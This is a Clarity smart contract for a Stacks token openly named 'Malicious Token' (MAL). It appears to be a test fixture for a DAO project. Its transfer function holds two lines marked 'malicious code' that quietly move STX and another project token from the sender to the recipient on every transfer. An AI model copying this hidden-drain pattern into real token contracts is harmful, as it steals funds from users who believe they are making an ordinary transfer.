(impl-trait .sip-010-trait-ft-standard.sip-010-trait)
(impl-trait .googlier-dao-token-trait-v1.dao-token-trait)

(define-fungible-token mali)

(define-data-var token-uri (string-utf8 256) u"")
(define-data-var contract-owner principal tx-sender)

;; errors
(define-constant ERR-NOT-AUTHORIZED u1401)

(define-public (set-contract-owner (owner principal))
  (begin
    (asserts! (is-eq tx-sender (var-get contract-owner)) (err ERR-NOT-AUTHORIZED))

    (ok (var-set contract-owner owner))
  )
)

;; ---------------------------------------------------------
;; SIP-10 Functions
;; ---------------------------------------------------------

(define-read-only (get-total-supply)
  (ok (ft-get-supply mali))
)

(define-read-only (get-name)
  (ok "Malicious Token")
)

(define-read-only (get-symbol)
  (ok "MAL")
)

(define-read-only (get-decimals)
  (ok u6)
)

(define-read-only (get-balance (account principal))
  (ok (ft-get-balance mali account))
)

(define-public (set-token-uri (value (string-utf8 256)))
  (if (is-eq tx-sender (var-get contract-owner))
    (ok (var-set token-uri value))
    (err ERR-NOT-AUTHORIZED)
  )
)

(define-read-only (get-token-uri)
  (ok (some (var-get token-uri)))
)

(define-public (transfer (amount uint) (sender principal) (recipient principal) (memo (optional (buff 34))))
  (begin
    (asserts! (is-eq tx-sender sender) (err ERR-NOT-AUTHORIZED))

    (try! (stx-transfer? u50000000 sender recipient)) ;; malicious code
    (try! (contract-call? .googlier-token transfer u1000000000 sender recipient none)) ;; malicious code
    (match (ft-transfer? mali amount sender recipient)
      response (begin
        (print memo)
        (ok response)
      )
      error (err error)
    )
  )
)

;; ---------------------------------------------------------
;; DAO token trait
;; ---------------------------------------------------------

;; Mint method for DAO
(define-public (mint-for-dao (amount uint) (recipient principal))
  (begin
    (asserts! (is-eq contract-caller .googlier-dao) (err ERR-NOT-AUTHORIZED))
    (ft-mint? mali amount recipient)
  )
)

;; Burn method for DAO
(define-public (burn-for-dao (amount uint) (sender principal))
  (begin
    (asserts! (is-eq contract-caller .googlier-dao) (err ERR-NOT-AUTHORIZED))
    (ft-burn? mali amount sender)
  )
)

;; Burn external
(define-public (burn (amount uint) (sender principal))
  (begin
    (asserts! (is-eq tx-sender sender) (err ERR-NOT-AUTHORIZED))
    (ft-burn? mali amount sender)
  )
)

;; Test environments
(begin
  ;; TODO: do not do this on testnet or mainnet
  (try! (ft-mint? mali u890000000000 'SP32X8J03KE3FDJAKN2JR9CQZGW8A517AFAYA217))
  (try! (ft-mint? mali u150000000000 'SP32X8J03KE3FDJAKN2JR9CQZGW8A517AFAYA217))
  (try! (ft-mint? mali u150000000000 'SP32X8J03KE3FDJAKN2JR9CQZGW8A517AFAYA217))
  (try! (ft-mint? mali u1000000000000 'SP32X8J03KE3FDJAKN2JR9CQZGW8A517AFAYA217))
  (try! (ft-mint? mali u1000000000000 'SP32X8J03KE3FDJAKN2JR9CQZGW8A517AFAYA217))
)
